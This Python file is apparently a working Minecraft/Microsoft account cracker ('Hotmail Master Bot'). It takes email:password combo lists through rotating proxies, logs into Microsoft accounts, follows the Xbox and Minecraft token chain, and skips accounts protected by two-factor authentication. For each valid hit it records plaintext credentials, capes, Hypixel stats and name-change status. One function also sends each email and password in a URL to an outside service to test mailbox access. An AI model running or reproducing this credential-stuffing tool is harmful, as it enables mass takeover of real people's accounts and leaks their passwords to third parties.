#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Minecraft Cracker Engine - Hotmail Master Bot
Full Minecraft account capture with Hypixel stats, capes, name changes
Based on working bot v2 checker.py logic
"""

import re
import json
import time
import uuid
import random
import logging
import threading
import requests
from datetime import datetime, timezone
from typing import Dict, List, Tuple, Optional, Any, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs

from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


class MCProxyManager:
    """Proxy manager for Minecraft engine"""
    
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        self.lock = threading.Lock()
        
        if proxy_file:
            self.load_proxies(proxy_file)
    
    def load_proxies(self, filepath: str):
        """Load proxies from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            self.proxies.append({
                                'http': f'http://{parts[0]}:{parts[1]}',
                                'https': f'http://{parts[0]}:{parts[1]}'
                            })
                        elif len(parts) == 4:
                            self.proxies.append({
                                'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                            })
            logger.info(f"Loaded {len(self.proxies)} proxies")
        except Exception as e:
            logger.error(f"Proxy load error: {e}")
    
    def get_random(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)


class MCCapture:
    """Container for Minecraft account data"""
    
    def __init__(self, email: str, password: str):
        self.email = email
        self.password = password
        
        # Basic Info
        self.gamertag = "N/A"
        self.uuid = "N/A"
        self.capes = "None"
        self.account_type = "Unknown"
        
        # Hypixel Stats
        self.hypixel_name = "N/A"
        self.hypixel_level = "N/A"
        self.first_login = "N/A"
        self.last_login = "N/A"
        self.bedwars_stars = "N/A"
        self.skyblock_coins = "N/A"
        self.hypixel_banned = "Unknown"
        
        # Other Info
        self.optifine_cape = "Unknown"
        self.email_access = "Unknown"
        self.name_change_allowed = "Unknown"
        self.last_name_change = "N/A"
        
        # Tokens
        self.access_token = None
        self.xbox_token = None
        self.xsts_token = None
        self.minecraft_token = None
    
    def to_text(self) -> str:
        """Format as text report"""
        lines = [
            "=" * 60,
            f"Email: {self.email}",
            f"Password: {self.password}",
            "",
            "[MINECRAFT PROFILE]",
            f"Gamertag: {self.gamertag}",
            f"UUID: {self.uuid}",
            f"Capes: {self.capes}",
            f"Account Type: {self.account_type}",
            "",
            "[HYPIXEL STATS]",
            f"Name: {self.hypixel_name}",
            f"Level: {self.hypixel_level}",
            f"First Login: {self.first_login}",
            f"Last Login: {self.last_login}",
            f"Bedwars Stars: {self.bedwars_stars}",
            f"Skyblock Coins: {self.skyblock_coins}",
            f"Banned: {self.hypixel_banned}",
            "",
            "[OTHER INFO]",
            f"OptiFine Cape: {self.optifine_cape}",
            f"Email Access: {self.email_access}",
            f"Name Change Allowed: {self.name_change_allowed}",
            f"Last Name Change: {self.last_name_change}",
            "=" * 60
        ]
        return "\n".join(lines)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'email': self.email,
            'password': self.password,
            'gamertag': self.gamertag,
            'uuid': self.uuid,
            'capes': self.capes,
            'account_type': self.account_type,
            'hypixel': {
                'name': self.hypixel_name,
                'level': self.hypixel_level,
                'first_login': self.first_login,
                'last_login': self.last_login,
                'bedwars_stars': self.bedwars_stars,
                'skyblock_coins': self.skyblock_coins,
                'banned': self.hypixel_banned
            },
            'other': {
                'optifine_cape': self.optifine_cape,
                'email_access': self.email_access,
                'name_change_allowed': self.name_change_allowed,
                'last_name_change': self.last_name_change
            }
        }


class MCEngine:
    """Minecraft account checker with full capture"""
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Dalvik/2.1.0 (Linux; U; Android 14; SM-G998B Build/UP1A.231005.007)"
    ]
    
    def __init__(self, proxy_file: Optional[str] = None, timeout: int = 15):
        self.proxy_manager = MCProxyManager(proxy_file) if proxy_file else None
        self.timeout = timeout
        self.uuid_val = str(uuid.uuid4())
    
    def _create_session(self) -> requests.Session:
        """Create session with proxy support"""
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'User-Agent': random.choice(self.USER_AGENTS)})
        session.verify = False
        
        if self.proxy_manager:
            proxy = self.proxy_manager.get_random()
            if proxy:
                session.proxies.update(proxy)
        
        return session
    
    def _get_urlPost_sFTTag(self, session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
        """Get login URL and PPFT token"""
        sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        
        try:
            r = session.get(sFTTag_url, timeout=self.timeout)
            text = r.text
            
            # Try escaped and unescaped patterns
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag
        except Exception as e:
            logger.debug(f"Get URLPost error: {e}")
        
        return None, None
    
    def _get_xbox_rps(self, session: requests.Session, email: str, password: str, 
                      urlPost: str, sFTTag: str) -> Tuple[Optional[str], requests.Session]:
        """Authenticate and get Xbox token"""
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, 
                                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                         allow_redirects=True, timeout=self.timeout)
            
            # Check for token in URL fragment
            if '#' in login_request.url and login_request.url != urlPost:
                fragment = urlparse(login_request.url).fragment
                token = parse_qs(fragment).get('access_token', [None])[0]
                if token and token != "None":
                    return token, session
            
            # Check for 2FA or error
            text_lower = login_request.text.lower()
            if any(value in text_lower for value in ["recover?mkt", "identity/confirm", "email/confirm", "/abuse?mkt="]):
                return "2FA", session
            elif any(value in text_lower for value in ["password is incorrect", "account doesn't exist", 
                                                        "sign in to your microsoft account", 
                                                        "tried to sign in too many times"]):
                return None, session
            
            return None, session
            
        except Exception as e:
            logger.debug(f"Xbox RPS error: {e}")
            return None, session
    
    def _get_xbox_token(self, rps_token: str, session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
        """Get Xbox Live token from RPS token"""
        try:
            url = "https://user.auth.xboxlive.com/user/authenticate"
            payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={rps_token}"
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            
            r = session.post(url, json=payload, headers={"Content-Type": "application/json"}, 
                           timeout=self.timeout)
            
            if r.status_code == 200:
                data = r.json()
                return data.get("Token"), data['DisplayClaims']['xui'][0]['uhs']
            
            return None, None
            
        except Exception as e:
            logger.debug(f"Xbox token error: {e}")
            return None, None
    
    def _get_xsts_token(self, xbox_token: str, session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
        """Get XSTS token"""
        try:
            url = "https://xsts.auth.xboxlive.com/xsts/authorize"
            payload = {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbox_token]
                },
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            
            r = session.post(url, json=payload, headers={"Content-Type": "application/json"},
                           timeout=self.timeout)
            
            if r.status_code == 200:
                data = r.json()
                return data.get("Token"), data["DisplayClaims"]["xui"][0]["uhs"]
            
            return None, None
            
        except Exception as e:
            logger.debug(f"XSTS error: {e}")
            return None, None
    
    def _get_minecraft_token(self, xsts_token: str, uhs: str, session: requests.Session) -> Optional[str]:
        """Get Minecraft access token"""
        try:
            url = "https://api.minecraftservices.com/authentication/login_with_xbox"
            payload = {"identityToken": f"XBL3.0 x={uhs};{xsts_token}"}
            
            r = session.post(url, json=payload, headers={"Content-Type": "application/json"},
                           timeout=self.timeout)
            
            if r.status_code == 200:
                return r.json().get("access_token")
            
            return None
            
        except Exception as e:
            logger.debug(f"MC token error: {e}")
            return None
    
    def _check_ownership(self, entitlements_response: Dict) -> str:
        """Determine account type from entitlements"""
        items = entitlements_response.get("items", [])
        has_normal_minecraft = False
        has_game_pass_pc = False
        has_game_pass_ultimate = False
        
        for item in items:
            name = item.get("name", "")
            source = item.get("source", "")
            if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
                has_normal_minecraft = True
            if name == "product_game_pass_pc":
                has_game_pass_pc = True
            if name == "product_game_pass_ultimate":
                has_game_pass_ultimate = True
        
        if has_normal_minecraft and has_game_pass_pc:
            return "Normal Minecraft (with Game Pass)"
        if has_normal_minecraft and has_game_pass_ultimate:
            return "Normal Minecraft (with Game Pass Ultimate)"
        elif has_normal_minecraft:
            return "Normal Minecraft"
        elif has_game_pass_ultimate:
            return "Xbox Game Pass Ultimate"
        elif has_game_pass_pc:
            return "Xbox Game Pass (PC)"
        else:
            # Check for other products
            others = []
            if 'product_minecraft_bedrock' in str(entitlements_response):
                others.append("Minecraft Bedrock")
            if 'product_legends' in str(entitlements_response):
                others.append("Minecraft Legends")
            if 'product_dungeons' in str(entitlements_response):
                others.append("Minecraft Dungeons")
            if others:
                return f"Other: {', '.join(others)}"
            return "No Minecraft"
    
    def _get_minecraft_profile(self, mc_token: str, session: requests.Session, capture: MCCapture) -> bool:
        """Get Minecraft profile (gamertag, UUID, capes)"""
        try:
            url = "https://api.minecraftservices.com/minecraft/profile"
            headers = {"Authorization": f"Bearer {mc_token}"}
            
            r = session.get(url, headers=headers, timeout=self.timeout)
            
            if r.status_code == 200:
                data = r.json()
                capture.gamertag = data.get("name", "N/A")
                capture.uuid = data.get("id", "N/A")
                
                capes = data.get("capes", [])
                if capes:
                    cape_names = [c.get("alias", "unknown") for c in capes if c.get("alias")]
                    capture.capes = ", ".join(cape_names) if cape_names else "None"
                else:
                    capture.capes = "None"
                
                return True
            elif r.status_code == 429:
                time.sleep(2)
                return self._get_minecraft_profile(mc_token, session, capture)
            
            return False
            
        except Exception as e:
            logger.debug(f"Profile error: {e}")
            return False
    
    def _check_hypixel(self, capture: MCCapture, session: requests.Session):
        """Check Hypixel stats via Plancke"""
        if capture.gamertag == "N/A":
            return
        
        try:
            url = f"https://plancke.io/hypixel/player/stats/{capture.gamertag}"
            r = session.get(url, timeout=self.timeout)
            
            if r.status_code == 200:
                text = r.text
                
                # Extract stats using regex
                name_match = re.search(r'property="og:description" content="([^"]+)"', text)
                if name_match:
                    capture.hypixel_name = name_match.group(1)
                
                level_match = re.search(r'<b>Level:</b>\s*([^<]+)<', text)
                if level_match:
                    capture.hypixel_level = level_match.group(1).strip()
                
                first_match = re.search(r'<b>First login:</b>\s*([^<]+)<', text)
                if first_match:
                    capture.first_login = first_match.group(1).strip()
                
                last_match = re.search(r'<b>Last login:</b>\s*([^<]+)<', text)
                if last_match:
                    capture.last_login = last_match.group(1).strip()
                
                # Bedwars stars
                bw_match = re.search(r'<li><b>Level:</b>\s*([^<]+)</li>', text)
                if bw_match:
                    capture.bedwars_stars = bw_match.group(1).strip()
                
                # Skyblock coins via SkyCrypt
                try:
                    sky_url = f"https://sky.shiiyu.moe/stats/{capture.gamertag}"
                    r2 = session.get(sky_url, timeout=10)
                    if r2.status_code == 200:
                        coin_match = re.search(r'Networth:\s*([^<\n]+)', r2.text)
                        if coin_match:
                            capture.skyblock_coins = coin_match.group(1).strip()
                except:
                    pass
                    
        except Exception as e:
            logger.debug(f"Hypixel error: {e}")
    
    def _check_optifine(self, capture: MCCapture, session: requests.Session):
        """Check OptiFine cape"""
        if capture.gamertag == "N/A":
            return
        
        try:
            url = f"http://s.optifine.net/capes/{capture.gamertag}.png"
            r = session.get(url, timeout=10)
            
            if r.status_code == 200 and len(r.content) > 100:
                capture.optifine_cape = "Yes"
            else:
                capture.optifine_cape = "No"
        except:
            capture.optifine_cape = "Unknown"
    
    def _check_email_access(self, capture: MCCapture):
        """Check email access via external API"""
        try:
            url = f"https://email.avine.tools/check?email={capture.email}&password={capture.password}"
            r = requests.get(url, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                if data.get("Success") == 1:
                    capture.email_access = "Yes"
                else:
                    capture.email_access = "No"
            else:
                capture.email_access = "Unknown"
        except:
            capture.email_access = "Unknown"
    
    def _check_name_change(self, mc_token: str, session: requests.Session, capture: MCCapture):
        """Check name change availability"""
        try:
            url = "https://api.minecraftservices.com/minecraft/profile/namechange"
            headers = {"Authorization": f"Bearer {mc_token}"}
            
            r = session.get(url, headers=headers, timeout=self.timeout)
            
            if r.status_code == 200:
                data = r.json()
                capture.name_change_allowed = str(data.get("nameChangeAllowed", "Unknown"))
                
                created_at = data.get("createdAt")
                if created_at:
                    try:
                        # Parse ISO date
                        given_date = datetime.strptime(created_at.replace('Z', '+00:00'), "%Y-%m-%dT%H:%M:%S.%f%z")
                        current_date = datetime.now(timezone.utc)
                        difference = current_date - given_date
                        years = difference.days // 365
                        months = (difference.days % 365) // 30
                        days = difference.days
                        
                        formatted = given_date.strftime("%m/%d/%Y")
                        if years > 0:
                            capture.last_name_change = f"{years} year{'s' if years != 1 else ''} ago - {formatted}"
                        elif months > 0:
                            capture.last_name_change = f"{months} month{'s' if months != 1 else ''} ago - {formatted}"
                        else:
                            capture.last_name_change = f"{days} day{'s' if days != 1 else ''} ago - {formatted}"
                    except:
                        capture.last_name_change = created_at
                        
        except Exception as e:
            logger.debug(f"Name change error: {e}")
    
    def check_account(self, email: str, password: str) -> MCCapture:
        """Perform full Minecraft account capture"""
        capture = MCCapture(email, password)
        session = self._create_session()
        
        try:
            # Step 1: Get login page and PPFT
            urlPost, sFTTag = self._get_urlPost_sFTTag(session)
            if not urlPost or not sFTTag:
                capture.account_type = "BAD"
                return capture
            
            # Step 2: Authenticate with Microsoft
            rps_token, session = self._get_xbox_rps(session, email, password, urlPost, sFTTag)
            
            if rps_token == "2FA":
                capture.account_type = "2FA Secured"
                return capture
            elif not rps_token:
                capture.account_type = "BAD"
                return capture
            
            # Step 3: Get Xbox token
            xbox_token, uhs = self._get_xbox_token(rps_token, session)
            if not xbox_token:
                capture.account_type = "BAD"
                return capture
            
            # Step 4: Get XSTS token
            xsts_token, uhs2 = self._get_xsts_token(xbox_token, session)
            if not xsts_token:
                capture.account_type = "BAD"
                return capture
            
            # Step 5: Get Minecraft token
            mc_token = self._get_minecraft_token(xsts_token, uhs2 or uhs, session)
            if not mc_token:
                capture.account_type = "BAD"
                return capture
            
            capture.minecraft_token = mc_token
            
            # Step 6: Get entitlements (account type)
            try:
                r = session.get('https://api.minecraftservices.com/entitlements/license', 
                              headers={'Authorization': f'Bearer {mc_token}'}, timeout=self.timeout)
                if r.status_code == 200:
                    capture.account_type = self._check_ownership(r.json())
                else:
                    capture.account_type = "Unknown"
            except:
                capture.account_type = "Unknown"
            
            # Step 7: Get Minecraft profile
            if not self._get_minecraft_profile(mc_token, session, capture):
                capture.account_type = "BAD"
                return capture
            
            # Step 8: Hypixel Stats
            self._check_hypixel(capture, session)
            
            # Step 9: OptiFine Cape
            self._check_optifine(capture, session)
            
            # Step 10: Email Access
            self._check_email_access(capture)
            
            # Step 11: Name Change Info
            self._check_name_change(mc_token, session, capture)
            
            return capture
            
        except Exception as e:
            logger.error(f"MC check error for {email}: {e}")
            capture.account_type = "ERROR"
            return capture
        finally:
            session.close()
    
    def check_batch(self, combos: List[Tuple[str, str]], threads: int = 30,
                   progress_callback: Optional[Callable] = None) -> List[MCCapture]:
        """Check multiple accounts in batch"""
        results = []
        lock = threading.Lock()
        checked = 0
        total = len(combos)
        
        def worker(combo):
            nonlocal checked
            email, pwd = combo
            capture = self.check_account(email, pwd)
            
            with lock:
                checked += 1
                # Only add hits (valid Minecraft accounts)
                if capture.account_type not in ["BAD", "ERROR", "2FA Secured", "Unknown", "No Minecraft"]:
                    results.append(capture)
                
                if progress_callback and checked % 5 == 0:
                    progress_callback(checked, total)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Batch worker error: {e}")
        
        return results